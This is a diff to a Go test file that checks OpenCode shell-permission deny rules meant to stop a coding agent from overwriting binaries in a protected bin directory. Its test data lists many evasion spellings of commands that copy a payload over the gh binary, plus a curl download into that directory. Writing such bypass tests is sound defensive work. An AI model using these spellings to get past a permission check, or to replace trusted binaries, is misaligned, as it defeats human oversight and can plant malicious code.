@@ -1184,6 +1184,21 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 					// The `/` boundary's accepted false deny (#3615 ADR-002): a
 					// path ending in a write verb, then running the binary.
 					"ls /usr/bin/install && " + gh + " doctor",
+					// #3627: escaped, quoted, split and brace-expanded verbs.
+					`\cp /tmp/payload.sh ` + gh,
+					`"cp" /tmp/payload.sh ` + gh,
+					`'cp' /tmp/payload.sh ` + gh,
+					`c''p /tmp/payload.sh ` + gh,
+					`c""p /tmp/payload.sh ` + gh,
+					`c\p /tmp/payload.sh ` + gh,
+					`'c'p /tmp/payload.sh ` + gh,
+					"{cp,/tmp/payload.sh," + gh + "}",
+					"{/bin/cp,/tmp/payload.sh," + gh + "}",
+					// #3627: a continued command, as OpenCode sees it whole.
+					"c\\\np /tmp/payload.sh " + gh,
+					"cp /tmp/payload.sh " + gh[:len(gh)-4] + "\\\n" + gh[len(gh)-4:],
+					"echo x > " + gh[:len(gh)-4] + "\\\n" + gh[len(gh)-4:],
+					"cp /tmp/payload.sh \\\n" + gh,
 				} {
 					if got := openCodePatternAction(pm, cmd); got != openCodeDeny {
 						t.Errorf("%s, %s: shell %q resolves to %q, want %q", c.name, grantName, cmd, got, openCodeDeny)
@@ -1191,18 +1206,36 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 				}
 				// OpenCode checks each line alone (#3623): the bare verb left
 				// by `cp\n<src> <dst>` must be denied on its own line.
-				split := "cp\n/tmp/payload.sh " + gh
-				lineDenied := false
-				for _, line := range strings.Split(split, "\n") {
-					if openCodePatternAction(pm, line) == openCodeDeny {
-						lineDenied = true
+				for _, split := range []string{
+					"cp\n/tmp/payload.sh " + gh,
+					"cp /tmp/payload.sh \\\n" + gh, // #3627: continuation line
+					"\"cp\"\n/tmp/payload.sh " + gh,
+					"c''p\n/tmp/payload.sh " + gh,
+					"'c'p\n/tmp/payload.sh " + gh,
+					"\"c\"p\n/tmp/payload.sh " + gh,
+					"true && cp /tmp/payload.sh \\\n" + gh,
+					"true && \\cp /tmp/payload.sh \\\n" + gh,
+					"\"cp\" /tmp/payload.sh \\\n" + gh,
+					"c''p /tmp/payload.sh \\\n" + gh,
+					"c\\\np /tmp/payload.sh " + gh, // continuation inside the verb
+					"true && cu\\\nrl -o " + gh + " https://example.invalid/x",
+					"echo x > " + gh[:len(gh)-4] + "\\\n" + gh[len(gh)-4:], // redirect continued inside binDir
+				} {
+					lineDenied := false
+					for _, line := range strings.Split(split, "\n") {
+						if openCodePatternAction(pm, line) == openCodeDeny {
+							lineDenied = true
+						}
+					}
+					if !lineDenied {
+						t.Errorf("%s, %s: no line of %q resolves to deny", c.name, grantName, split)
 					}
 				}
-				if !lineDenied {
-					t.Errorf("%s, %s: no line of %q resolves to deny", c.name, grantName, split)
-				}
 				for _, verb := range openCodeShellBinDirWriteVerbs {
-					for _, cmd := range []string{verb, verb + " ", verb + "\t", "/bin/" + verb, "/usr/bin/" + verb} {
+					bare := []string{verb, verb + " ", verb + "\t", "/bin/" + verb, "/usr/bin/" + verb}
+					bare = append(bare, openCodeShellQuotedVerbSpellings(verb)...)
+					bare = append(bare, openCodeShellSplitVerbSpellings(verb)...)
+					for _, cmd := range bare {
 						if got := openCodePatternAction(pm, cmd); got != openCodeDeny {
 							t.Errorf("%s, %s: bare shell %q resolves to %q, want %q", c.name, grantName, cmd, got, openCodeDeny)
 						}
@@ -1232,6 +1265,11 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 					"npm install",
 					"go install ./cmd/x",
 					"ddate",
+					`git commit -m "fix" && ` + gh + " doctor",
+					"echo 'a,b' && " + gh + " doctor",
+					"echo 'cp,mv' && " + gh + " doctor",
+					"go test ./... \\",
+					gh + " pr create --title x \\",
 				} {
 					if got := openCodePatternAction(pm, cmd); got == openCodeDeny {
 						t.Errorf("%s, %s: shell %q resolves to deny; running a binary from the bin dir must stay allowed", c.name, grantName, cmd)
@@ -1240,8 +1278,40 @@ func TestOpenCodeShellPermissionDeniesBinDirWrites(t *testing.T) {
 			}
 		}
 	}
+	// Accepted fail-safe denies of a continued line (#3627).
+	pm := openCodePermissionMap(RunOptions{AllowedTools: []string{"Bash"}}, realBin).Shell
+	for _, line := range []string{"curl -sS \\", "npm install foo \\", "go install ./cmd/x \\", "cmd 2>&1 \\"} {
+		if got := openCodePatternAction(pm, line); got != openCodeDeny {
+			t.Errorf("continued %q resolves to %q, want the accepted fail-safe %q", line, got, openCodeDeny)
+		}
+	}
 	if pats := openCodeShellBinDirDenyPatterns("", ""); pats != nil {
 		t.Errorf("no bin dir: patterns = %q, want none", pats)
+	}
+}
+
+// TestOpenCodeShellSplitVerbSpellings pins the split spellings (#3627).
+func TestOpenCodeShellSplitVerbSpellings(t *testing.T) {
+	got := openCodeShellSplitVerbSpellings("tee")
+	want := []string{`t''ee`, `t""ee`, `t'ee`, `t"ee`, `t\ee`, `te''e`, `te""e`, `te'e`, `te"e`, `te\e`}
+	if !slices.Equal(got, want) {
+		t.Errorf("split spellings of tee = %q, want %q", got, want)
+	}
+	if n := len(openCodeShellSplitVerbSpellings("install")); n != 6*len(openCodeShellSplitVerbQuotes) {
+		t.Errorf("install: %d spellings, want %d", n, 6*len(openCodeShellSplitVerbQuotes))
+	}
+}
+
+// TestOpenCodeShellBinDirDenyPatternsSize bounds the deny list: OpenCode's
+// config travels in one environment variable, capped at 128 KiB on Linux.
+func TestOpenCodeShellBinDirDenyPatternsSize(t *testing.T) {
+	forms := "/private/var/folders/xx/yyyyyyyyyyyyyyyyyyyyyyyy/T/nightgauge-bin-1234567890"
+	b, err := json.Marshal(openCodeShellBinDirDenyPatterns(forms, ""))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(b) > 80<<10 {
+		t.Errorf("bin-dir shell deny patterns for one form serialise to %d bytes, want <= %d", len(b), 80<<10)
 	}
 }
 
